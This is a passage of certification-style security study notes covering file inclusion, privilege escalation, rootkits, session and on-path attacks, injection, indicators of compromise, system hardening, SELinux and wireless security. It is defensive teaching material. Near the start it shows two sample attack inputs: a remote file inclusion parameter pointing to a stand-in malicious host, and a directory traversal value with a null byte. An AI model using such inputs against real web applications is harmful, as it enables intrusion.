  - Web application vulnerability that allows an attacker either to download a file
    from an arbitrary location on the host file system or to upload an executable or
    script file to open a backdoor
  - Remote File Inclusion

## An attacker executes a script to inject a remote file into the web app or

website

- https://diontraining.com/login.php?
- user=http://malware.bad/malicious.php
  - Local File Inclusion

## An attacker adds a file to the web app or website that already exists on

the hosting server

- https://diontraining.com/login.php
- user= ../../Windows/system32/cmd.exe%00
  - Logs containing ../ pertain to directory traversals
- To prevent directory traversals and file inclusion attacks, use proper input validation

## Execution and Escalation Attacks

- Arbitrary Code Execution
  - Vulnerability allows an attacker to run their code without restrictions
  - Lets attackers execute their code on the target system
- Remote Code Execution
  - Type of arbitrary code execution that occurs remotely, often over the internet
- Privilege Escalation
  - Gaining higher-level permissions than originally assigned
  - Allows attackers to operate with elevated privileges, such as administrator or
    root access
  - Vertical Privilege Escalation

## Going from normal user to higher privilege (e.g., admin or root)

## Commonly associated with code execution leading to admin-level

permissions

- Horizontal Privilege Escalation

## Accessing or modifying resources at the same level as the attacker

## Occurs when a user attempts to access resources for which they don’t

have permissions at the same level

- Understanding Privileges

## Application and process privileges are required for executing functions,

reading, and writing data

## Applications inherit the permissions of the user running them (e.g.,

system, admin, or user)

## Understanding and managing privileges is crucial for system security

## Attackers aim to gain higher privileges to perform malicious actions

- Rootkits
  - Class of malware that conceals its presence by modifying system files, often at
    the kernel level
  - Can be challenging to detect and provides attackers with persistence
  - Ring Levels

## Ring Zero

- The kernel (center) with the highest privileges
- Kernel mode rootkits (Ring Zero) are more dangerous due to their
  extensive control

## Rings 1 to 3

- User-level components with decreasing privileges as the ring
  number increases
  - Kernel Mode Rootkit

## Embedded in the kernel (Ring Zero)

## Has maximum control and privileges

## Highly dangerous due to the extensive system access

- User Mode Rootkit

## Attached to user-level components (Rings 1 to 3)

## Has administrator-level privileges

## Utilizes operating system features for persistence, e.g., registry or task

scheduler

## Replay Attacks

- Replay Attacks
  - Type of network-based attack where valid data transmissions are maliciously or
    fraudulently re-broadcast, repeated, or delayed
  - Involves intercepting data, analyzing it, and deciding whether to retransmit it
    later
  - Different from a Session Hijack

## In a Session Hijack, the attacker alters real-time data transmission

## In a Replay Attack, the attacker intercepts the data and then can decide

later whether to retransmit the data

- Applications of Replay Attacks
  - Not limited to banking; can occur in various network transmissions

## Email

## Online shopping

## Social media

- Common in wireless authentication attacks, especially with older encryption
  protocols like WEP (Wired Equivalent Privacy)
- Credential Replay Attack
  - Specific type of replay attack that Involves capturing a user’s login credentials
    during a session and reusing them for unauthorized access
- Preventing Replay Attacks
  - Use session tokens to uniquely identify authentication sessions
  - Session tokens are generated for each session, making it challenging for attackers
    to replay sessions
  - Implement multi-factor authentication to require additional authentication
    factors, making replay more difficult
  - By using multi-factor authentication, attackers lack the necessary additional
    information to replay login sessions
  - Implement security protocols like WPA3 (Wi-Fi Protected Access 3) to mitigate
    replay attack threats

## Session Hijacking

- Session Management
  - Fundamental security component in web applications
  - Enables web applications to uniquely identify a user across a number of different
    actions and requests, while keeping the state of the data generated by the user
    and ensuring it is assigned to that user
- Cookie
  - Text file used to store information about a user when they visit a website
  - Cookies must be protected because they contain client information that is being
    transmitted across the Internet
  - Session cookies

## Non-persistent, reside in memory, and are deleted when the browser

instance is closed

- Persistent Cookies

## Cookies that are stored in the browser cache until they are deleted by the

user or pass a defined expiration date

## Cookies should be encrypted if they store confidential information

- Session Hijacking
  - A type of spoofing attack where the attacker disconnects a host then replaces it
    with his or her own machine, spoofing the original host’s IP address
  - Session hijacking attacks can occur through the theft or modification of cookies
- Session Prediction Attacks
  - A type of spoofing attack where the attacker attempts to predict the session
    token to hijack a session
  - A session token must be generated using a non-predictable algorithm and it must
    not reveal any information about the session client
- Cookie Poisoning
  - Modifies the contents of a cookie after it has been generated and sent by the
    web service to the client’s browser so that the newly modified cookie can be
    used to exploit vulnerabilities in the web app

## On-path Attacks

- On-Path Attack
  - An attack where the attacker positions their workstation logically between two
    hosts during communication
  - The attacker transparently captures, monitors, and relays communications
    between those hosts
- Methods for On-Path Attacks
  - ARP Poisoning

## Manipulating Address Resolution Protocol (ARP) tables to redirect

network traffic

- DNS Poisoning

## Altering DNS responses to reroute traffic

- Rogue Wireless Access Point

## Creating a fake wireless access point to intercept traffic

- Rogue Hub or Switch

## Introducing a malicious hub or switch to capture data on a wired network

- Replay Attack
  - Occurs when an attacker captures valid data and then replays it immediately or
    with a delay
  - Common in wireless network attacks; can also be used in wired networks
- Relay Attack
  - The attacker becomes part of the conversation between two hosts
  - Serves as a proxy and can read or modify communications between the hosts
  - Any traffic between the client and server goes through the attacker
- Challenges with Replay and Relay
  - Encryption can make interception and crafting communication difficult
  - Strong encryption schemes like TLS 1.3 can pose significant challenges for
    attackers
  - Techniques like SSL stripping may be used to downgrade encryption to an
    unsecured connection

## SSL Stripping

- An attack that tricks the encryption application into presenting an
  HTTP connection instead of HTTPS
- Enables attackers to capture unencrypted data when the user
  believes they are using a secure connection
- Downgrade Attack
  - An attacker forces a client or server to abandon a higher security mode in favor
    of a lower security mode
  - Scope of Downgrade Attacks

## Downgrade attacks can be used with various encryption and protection

methods, including Wi-Fi and VPNs

## Any situation where a client agrees to a lower level of security that is still

backward compatible can be vulnerable to a downgrade attack

## Injection Attacks

- Lightweight Directory Access Protocol (LDAP)
  - An open, vendor-neutral, industry standard application protocol for accessing
    and maintaining distributed directory information services over an Internet
    Protocol network
- LDAP Injection
  - An application attack that targets web-based applications by fabricating LDAP
    statements that are typically created by user input
  - Use input validation and input sanitization as protection against an LDAP
    injection attack
- Command Injection
  - Occurs when a threat actor is able to execute arbitrary shell commands on a host
    via a vulnerable web application
- Process Injection
  - Method of executing arbitrary code in the address space of a separate live
    process
  - There are many different ways to inject code into a process

## Injection through DLLs

## Thread Execution Hijacking

## Process Hollowing

## Process Doppel Ganging

## Asynchronous Procedure Calls

## Portable Executable Injections

- Mitigation includes

## Endpoint security solutions that are configured to block common

sequences of attack behavior

## Security Kernel Modules

## Practice of Least Privilege

## Indicators of Compromise (IoC)

- Indicators of Compromise (IoC)
  - Pieces of forensic data that identify potentially malicious activity on a network or
    system
  - Serves as digital evidence that a security breach has occurred
- IoC includes the following
- Account Lockouts
  - Occurs when an account is locked due to multiple failed login attempts
  - Indicates a potential brute force attack to gain access
  - Balancing security with usability is crucial when implementing account
    lockout
- Concurrent Session Usage
  - Refers to multiple active sessions from a single user account
  - Indicates a possible account compromise when the legitimate user is also
    logged in
- Blocked Content
  - Involves attempts to access or download content blocked by security
    protocols
  - Suggests a user trying to access malicious content or an attacker
    attempting to steal data
- Impossible Travel
  - Detects logins from geographically distant locations within an
    unreasonably short timeframe
  - Indicates a likely account compromise as physical travel between these
    locations is impossible
- Resource Consumption
  - Unusual spikes in resource utilization

## CPU

## Memory

## Network bandwidth

- May indicate malware infections or Distributed Denial of Service (DDoS)
  attacks
- Resource Inaccessibility
  - Inability to access resources like files, databases, or network services
  - Suggests a ransomware attack, where files are encrypted, and a ransom is
    demanded
- Out-of-Cycle Logging
  - Log entries occurring at unusual times
  - Indicates an attacker trying to hide their activities during off-peak hours
- Missing Logs
  - Sign that logs have been deleted to hide attacker activities
  - May result in gaps in the log data, making it harder to trace the attacker’s
    actions
- Published Articles or Documents
  - Attackers publicly disclose their actions, boasting about their skills or
    causing reputational damage
  - Can occur on social media, hacker forums, newspaper articles, or the
    victim’s own website
    Hardening
    Objectives:

## 2.5 - Explain the purpose of mitigation techniques used to secure the enterprise

## 4.1 - Given a scenario, you must be able to apply common security techniques to computing

resources

## 4.5 - Given a scenario, you must be able to modify enterprise capabilities to enhance security

## Hardening

- Hardening
  - Process of enhancing system, application, or network security
  - Measures

## Apply security patches, configure access controls, disable unnecessary

services

- Purpose

## Strengthen overall security posture and resilience against cyberattacks

- Study Topics
  - Default Configurations

## Definition and identification of default configurations

## Changing default passwords, open ports, and insecure configurations

- Restricting Applications

## Application restriction approach

## Allow listing, blocking unauthorized software

- Disabling Unnecessary Services

## Identifying unnecessary services

## Risks and consequences of running unnecessary services

## Disabling unnecessary services to reduce the attack surface

- Trusted Operating Systems

## Definition and characteristics of trusted operating systems

## Rigorous security evaluations and certifications

- Updates and Patches

## Understanding updates vs. patches

## Importance of regular software updates

## Systematic process of patch management

- Group Policies

## Role of Group Policies in Windows environments

## Central management and control of user and computer settings

- SELinux (Security-Enhanced Linux)

## Role and implementation of SELinux

## Mandatory access controls for enhanced security

- Data Encryption Levels

## Different levels of data encryption

- Full-disk
- Partition
- File
- Volume
- Database
- Record Level Encryption
  - Secure Baselines

## Definition and purpose of secure baselines

## Establishing a secure starting point for minimizing security risks

## Changing Default Configurations

- Default passwords
  - Preset authentication details
  - Should be immediately changed
  - Rotate every 90 days
  - Rely on password manager
- Unneeded ports and protocols
  - Close any ports that aren’t needed
  - Audit ports and protocols that are enabled
  - Look for secure versions of protocols and use them instead
- Extra open ports
  - May be open by default
  - Use the more secure ports and close the insecure ones

## Restricting Applications

- Least Functionality
  - Involves configuring systems with only essential applications and services
  - Least functionality aims to provide only the necessary applications and services
  - Unneeded applications should be restricted or uninstalled to reduce
    vulnerabilities
  - Over time, personal computers accumulate unnecessary programs
- Managing Software
  - Keeping software up-to-date is crucial for security
  - New programs may be installed without removing old versions
  - Large networks require preventive measures to control excessive installations
- Creating Secure Baseline Images
  - Secure baseline images are used to install new computers
  - Images include the OS, minimum required applications, and strict configurations
  - These images should be updated based on evolving business needs
- Preventing Unauthorized Software
  - Unauthorized software installation poses security risks
  - Application allowlisting and blocklisting are used to control which applications
    can run on a workstation
- Application Allowlisting
  - Only applications on the approved list are allowed to run
  - All other applications are blocked from running
  - Similar to an “Explicit Allow” statement in access control
- Application Blocklisting
  - Applications placed on the blocklist are prevented from running
  - All other applications are permitted to run
  - Any application on the blocklist is denied
- Choosing Between Allowlisting and Blocklisting
  - Allowlisting is more secure, as everything is denied by default
  - Managing allowlists can be challenging as updates require list adjustments
  - Blocklisting is less secure, as everything is allowed except what’s explicitly denied
  - Managing blocklists can be difficult, as every new program variation would be
    allowed until a rule is created
- Centralized Management
  - Microsoft Active Directory domain controllers allow centralized management of
    lists
  - Group policies can be used to deploy and manage allowlists and blocklists across
    workstations in a network

## Trusted Operating Systems

- Trusted Operating System (TOS)
  - An operating system that is designed to provide a secure computing environment
    by enforcing stringent security policies that usually rely on mandatory access
    controls
  - Used where Confidentiality, Integrity, and Availability is essential
- Evaluation Assurance Level (EAL)
  - A predefined security standard and certification from the Common Criteria for
    Information Technology Security Evaluation
  - Common criteria standards are used to assess the effectiveness of the security
    controls in an operating system

## EAL 1 is the lowest level of assurance

## EAL 7 is the highest level of assurance

- Trusted operating systems often include
  - Mandatory Access Control

## Access permissions are determined by a policy defined by the system

administrators and enforced by the operating system

- Security Auditing
- Role-based Access Control
- Examples
  - SELinux (Security-Enhanced Linux)

## Set of controls that are installed on top of another Linux distribution like

CentOS or Red Hat Linux

- Trusted Solaris

## Offers secure, multi-level operations with MAC, detailed system audits,

and data/process compartmentalization

- Trusted OS enhances security with microkernels by minimizing the trusted base and
  reducing attack surface and vulnerabilities
- Choosing an operating system requires balancing security with usability, performance,
  and functional requirements

## Updates and Patches

- Patch management can be
  - Manual

## Rare for fully manual patch management these days

- Automated

## More reliable and most often used

- Hackers can reverse engineer patches to find the underlying vulnerability
- Hotfix
  - A software patch that solves a security issue and should be applied immediately
    after being tested in a lab environment
- Update
  - Provides a system with additional functionality, but it doesn’t usually provide any
    patching of security related issues
  - Often introduce new vulnerabilities
- Service Pack
  - Includes all the hotfixes and updates since the release of the operating system
- Effective Patch Management involves
  - Assigning a dedicated team to track vendor security patches
  - Establishing automated system-wide patching for OS and applications
  - Including cloud resources in patch management
  - Categorizing patches as urgent, important, or non-critical for prioritization
  - Create a test environment to verify critical patches before production
    deployment
  - Maintaining comprehensive patching logs for program evaluation and monitoring
  - Establishing a process for evaluating, testing, and deploying firmware updates
  - Developing a technical process for deploying approved urgent patches to
    production
  - Periodically assessing non-critical patches for combined rollout

## Patch Management

- Patch Management
  - Planning, testing, implementing, and auditing of software patches
- Important for compliance
- Four Step Process
  - Planning

## Creating policies, procedures, and systems to track and verify patch

compatibility

## A good patch management tool confirms patch deployment, installation,

and functional verification on servers or clients

- Testing

## Do this to prevent the patch from causing additional problems

- Implementing

## Deploy to all devices that need it

## Can be done manually or automated

## Large organizations should use a central update server instead of

Windows Update or other tool

## Mobile devices can be patched using an MDM

## Patch Rings

- Implement patches one group (or ring) at a time
  - Auditing

## Scan network to ensure the patch was installed correctly

## Determine if there are any unexpected problems as a result of the patch

- Firmware versions should also be monitored and patched
  - Companies will have centralized resources to help keep firmware patched

## Group Policies

- Group Policy
  - A set of rules and policies that can be applied to users or computer accounts
    within an operating system
- Accessing Group Policy Editor
  - Access the Group Policy Editor by entering “gpedit” in the run prompt
  - The local Group Policy Editor is used to create and manage policies within a
    Windows environment
- Group Policies Overview
  - Each policy acts as a security template applying rules such as

## Password complexity requirements,

## Account lockout policies

## Software restrictions

## Application restrictions

- In a Windows environment with an Active Directory domain controller, you have
  access to an advanced Group Policy Editor
- Security Templates
  - A group of policies that can be loaded through one procedure
  - In corporate environments, create security templates with predefined rules
    based on administrative policies
  - Security Template

## A group of policies that can be loaded through the Group Policy Editor

- Group Policy Objective (GPO)

## Used to harden the operating system and establish secure baselines

- Baselining
  - A process of measuring changes in the network, hardware, or software
    environment
  - Helps establish what “normal” is for the organization
  - Identifies abnormal or deviations for investigation
- Group Policy Editor in Windows
  - Access the Group Policy Editor by entering “gpedit” in the run prompt
  - Create allow or block list rules for application control policies
- Creating a Rule in Group Policy Editor
  - Launch the Group Policy Editor
  - Navigate to “Computer Configuration” > “Windows Settings” > “Security Settings”

> “Application Control Policies” > “App Locker”

- Create an executable rule
- Choose to allow or deny
- Select who the rule applies to (e.g., everyone)
- Define the rule based on conditions like publisher, path, or file hash.
- Specify the path to be blocked (e.g., the temp directory)
- Name the rule and provide a description
- Decide whether to create default rules (allow or deny) and save the policy
- Deploy the policy across the environment for system hardening
- Rules in Group Policy Editor
  - Allow Rules (Default)

## Allow files in the “Program Files” directory to launch

## Allow files in the “Windows” folder to launch

## Allow administrators to launch any file

- Deny Rule (Custom)

## Block all files from running in the “temp directory”

- By following these steps, you can establish a secure baseline for your Windows systems,
  improving overall security and policy management

## SELinux

- SELinux and MAC Basics
  - SELinux (Security Enhanced Linux)

## A security mechanism that provides an additional layer of security for

Linux distributions

## Enforces Mandatory Access Control (MAC)

- Mandatory Access Control (MAC)

## Restricts access to system resources based on subject clearance and

object labels

- Context-based permissions

## Permission schemes that consider various properties to determine

whether to grant or deny access to a user

- Two main context-based permission schemes in Linux that use MAC

## SELinux

## AppArmor

- DAC vs. MAC

## DAC (Discretionary Access Control)

- Each object has a list of entities that are allowed to access it
- Allows object owners to directly control access using tools like
  ‘chown’ and ‘chmod’

## SELinux relies on MAC for permissions and access control, not DAC

- SELinux
  - The default context-based permission scheme in CentOS and Red Hat Enterprise
    Linux created by NSA
  - Used to enforce MAC on processes and resources
  - Enables information to be classified and protected
  - Enhances file system and network security, preventing unauthorized access,
    security breaches, and execution of untrustworthy programs
- Three Main Contexts in SELinux
  - User Context

## Defines which users can access an object, including common contexts like

‘unconfined_u,’ ‘user_u,’ ‘sysadm_u,’ and ‘root’

- Role Context

## Determines which roles can access an object, using ‘object_r’ for files and

directories

- Type Context

## Essential for fine-grained access control, grouping objects with similar

security characteristics

- Optional Context
  - Level Context

## Describes the sensitivity level of a file, directory, or process

## Known as a multi-level security context, allowing further access control

refinement

- SELinux Modes
  - Disabled Mode

## Turns off SELinux, relying on default DAC for access control

- Enforcing Mode

## Enforces all SELinux security policies, preventing policy violations

- Permissive Mode

## Enables SELinux but doesn’t enforce policies, allowing processes to

bypass security policies

- SELinux Policies
  - SELinux Policy

## Describes access permissions for users, programs, processes, files, and

devices

- Two Main Policy Types

## Targeted Policies

- Only specific processes are confined to a domain, while others run
  unconfined

## Strict Policies

- Every subject and object operates under MAC, but it’s more
  complex to set up
- Violation Messages
  - SELinux captures violation messages in an audit log
  - Violations can occur when someone tries to access an unauthorized object, or an
    action contradicts an existing policy
- Policy Configuration
  - Initial SELinux setup may result in false violations, requiring policy tweaking and
    fine-tuning
  - Strong security depends on creating effective restricted profiles and hardening
    applications to prevent malicious attacks

## Data Encryption Levels

- Data Encryption
  - Process of converting data into a secret code to prevent unauthorized access
- Levels
  - Full-disk

## Encrypts the entire hard drive to protect all of the data being stored on it

- Partition

## Similar to full-disk encryption but it is only applied to a specific partition

on the storage device

## VeraCrypt

- Tool that selectively encrypts partitions, like sensitive documents,
  while leaving the OS partition unencrypted
  - Volume

## Used to encrypt a set space on the storage medium

## Creates an encrypted container that can house various files and folders

- File-level Encryption

## Used to encrypt an individual file instead of an entire partition or an

entire disk drive

## GNU Privacy Guard

- A tool that provides cryptographic privacy and authentication for
  data communication
  - Database

## Secures the entire database

## Can extend the encryption across multiple storage devices or cloud

storage

## Similar to full-disk encryption

- Record

## Encrypts individual records or rows within a database

## Secure Baselines

- Secure Baseline
  - Standard set of security configurations and controls applied to systems,
    networks, or applications to ensure a minimum level of security
  - Helps organizations maintain consistent security postures and mitigate common
    vulnerabilities
- Establishing a Secure Baseline
  - The process begins with a thorough assessment of the system, network, or
    application that requires protection
  - Identify the type of data involved, understand data workflows, and evaluate
    potential vulnerabilities and threats
  - Best practices, industry standards, and compliance requirements (e.g., ISO
    27001, NIST SP 800-53) are used as starting points for defining the secure
    baseline
  - Create a secure baseline configuration by securing the operating system on a
    reference device (e.g., a laptop)
- Configuring a Secure Baseline
  - Install, update, configure, and secure the operating system on the reference
    device
  - Check the device against baseline configuration guides and scan for known
    vulnerabilities or misconfigurations
  - Install required applications (e.g., Microsoft Office suite, endpoint detection and
    response agents)
  - Scan for vulnerabilities in the installed applications and remediate them
  - Create an image of the reference device as the “known good and secure
    baseline”
- Deployment
  - Configure firewalls, set up user permissions, implement encryption protocols,
    and ensure antivirus and anti-malware solutions are properly installed and
    updated
  - Use automated tools and scripts to ensure consistent application of the secure
    baseline across devices
  - In a Windows environment, Group Policy Objects (GPO) can be used to dictate
    policies, user rights, and audit settings
  - In cloud environments (e.g., AWS), services like AWS Config are employed to
    define and deploy secure configurations
- Maintenance
  - Lock down systems to prevent unauthorized software installation or
    configuration changes
  - Regular audits, monitoring, and continuous assessment are required to keep the
    baseline up-to-date
  - Continuous monitoring tools help identify deviations from the baseline and
    trigger alerts for immediate remediation
  - Periodically review and update the secure baseline to adapt to changes in
    organizational infrastructure, business needs, and emerging threats
- Employee Training and Awareness
  - Conduct training sessions to educate employees about the importance of
    adhering to secure baseline configurations
  - Raise awareness about the potential risks of deviating from the baseline
  - Encourage employees to report any suspicious activities they notice when using
    their systems
    Security Techniques
    Objectives:

## 4.1 - Given a scenario, you must be able to apply common security techniques to computing

resources

## 4.5 - Given a scenario, you must be able to modify enterprise capabilities to enhance security

## Security Techniques

- Security Techniques
  - Protecting digital assets from evolving cyber threats
  - Scope

## Traditional to advanced security techniques

- Study Topics
  - Wireless Infrastructure Security

## Significance of wireless networks

## Challenges and security considerations

- Wireless Security Settings

## WPA3, AAA/RADIUS, Cryptographic protocols

## Authentication protocols in wireless security

- Application Security

## Input validation, secure cookies

## Static and dynamic code analysis

## Code signing and sandboxing

- Network Access Control (NAC)

## Purpose and functionality of NAC

## Policy enforcement on devices and users

- Web and DNS Filtering

## Agent-based web filters, centralized proxy

## URL scanning, content categorization, block rules

## Reputation-based filtering

- Email Security

## DMARC, DKIM, SPF protocols

## Gateway protocol and spam filtering techniques

- Endpoint Detection and Response (EDR)

## Continuous monitoring of endpoint devices

## Identifying, investigating, and preventing cyber threats

- User Behavior Analytics (UBA)

## Leveraging machine learning and data analytics

## Identifying potentially harmful activities

## Detection of anomalies or deviations

- Selecting Secure Protocols

## Protocol selection, port selection

## Transport method selection

## Wireless Infrastructure Security

- Wireless Infrastructure Security
  - Crucial for securing wireless networks in organizations
  - Placement of Wireless Access Points (WAPs) impacts network performance and
    security
- Wireless Access Point Placement
  - WAPs allow wireless devices to connect to a wired network using Wi-Fi standards
  - Placement influences

## Network range

## Coverage

## Security

- Proper placement prevents unauthorized access by limiting signal leakage or
  dead zones
- Is a huge concern in terms of the security of the wireless network
- Placement Considerations
  - Avoid placing WAPs near external walls or windows to prevent signal leakage
  - Place WAPs in central locations for optimal coverage
  - Use unidirectional antennas when WAPs are near external walls
  - Mount WAPs on higher locations, such as ceilings, for better coverage
- Extended Service Set (ESS)
  - Multiple WAPs work together to provide seamless network coverage
  - Important for large buildings where a single WAP is insufficient
- Wireless Access Point Interference
  - Interference occurs when multiple WAPs use the same channels or overlapping
    frequencies
  - Types

## Co-Channel Interference

## Adjacent Channel Interference

- In the 2.4 GHz band, select Channels 1, 6, and 11 to avoid overlap
- Tools for ensuring good Wireless Access Point Coverage
  - Site Surveys

## Essential for planning and designing wireless networks

## Involves a site visit to test for radio frequency interference and identify

optimal WAP installation locations

- Heat Maps

## Graphical representations of

- Wireless coverage
- Signal strength
- Frequency utilization

## Useful for troubleshooting

- Coverage issues
- Dead zones
- Signal leakage

## Aid in visualizing the effectiveness of WAP placement and configuration

## Wireless Security Settings

- Wireless Security Settings
  - Crucial for securing wireless networks due to increasing usage
- Wireless Encryption
  - Wireless encryption is essential for data confidentiality in wireless networks
- WEP (Wired Equivalent Privacy)
  - Introduced in 1999 as part of IEEE 802.11
  - Utilizes a static encryption key system
  - Considered insecure due to its weak 24-bit initialization vector
- WPA (Wi-Fi Protected Access)
  - Introduced in 2003 as an improvement over WEP
  - Implemented TKIP for dynamic key generation
  - Inherited some vulnerabilities from WEP
  - Due to TKIP vulnerabilities, it was susceptible to cryptographic attacks
  - Insecure due to insufficient data integrity checks in the TKIP implementation
- WPA2 (Wi-Fi Protected Access 2)
  - Introduced in 2004, replacing WPA.
  - Uses AES protocol and CCMP protocol for stronger encryption

## AES - Advanced Encryption Standard

## CCMP - Counter Cipher Mode with Block Chaining Message

Authentication Code

- Introduced Message Integrity Code (MIC) for integrity checking
- WPA3 (Wi-Fi Protected Access 3)
  - The latest and most secure wireless security protocol.
  - Uses AES for encryption and introduces new features.
  - Features

## Simultaneous Authentication of Equals (SAE)

- Replaces the 4-way handshake with a Diffie-Hellman key
  agreement
- Protects against offline dictionary attacks

## Enhanced Open (Opportunistic Wireless Encryption)

- Provides individualized data encryption even in open networks
- Improves privacy and security in open Wi-Fi scenarios

## Updated Cryptographic Protocols

- AES GCMP replaces AES CCMP used in WPA2
- Supports both 128-bit and 192-bit AES for enhanced security

## Management Frame Protection

- Ensures the integrity of network management traffic
- Prevents eavesdropping, forging, and tampering with
  management frames
- AAA Protocols
  - Important for centralized user authentication and access control
  - Examples

## RADIUS (Remote Authentication Dial-In User Service)

- Offers Authentication, Authorization, and Accounting services
- Widely used for secure access to network resources

## TACACS+ (Terminal Access Controller Access-Control System Plus)

- Separates Authentication, Authorization, and Accounting
  functions
- More granular control
- Encrypts the authentication process using TCP for enhanced
  security
- Authentication Protocols
  - Used to verify user identity and control network access
  - EAP (Extensible Authentication Protocol)

## Authentication framework supporting multiple methods

## Provides common functions and negotiation of authentication protocols

- PEAP (Protected Extensible Authentication Protocol)

## Encapsulates EAP within an encrypted TLS tunnel

## Developed jointly by Cisco Systems, Microsoft, and RSA Security

- EAP-TTLS (Extensible Authentication Protocol-Tunneled Transport Layer Security)

## Extends TLS support across platforms

## Requires server-side certificates for security

- EAP-FAST (Extensible Authentication Protocol-Flexible Authentication via Secure
  Tunneling)

## Developed by Cisco Systems for secure re-authentication
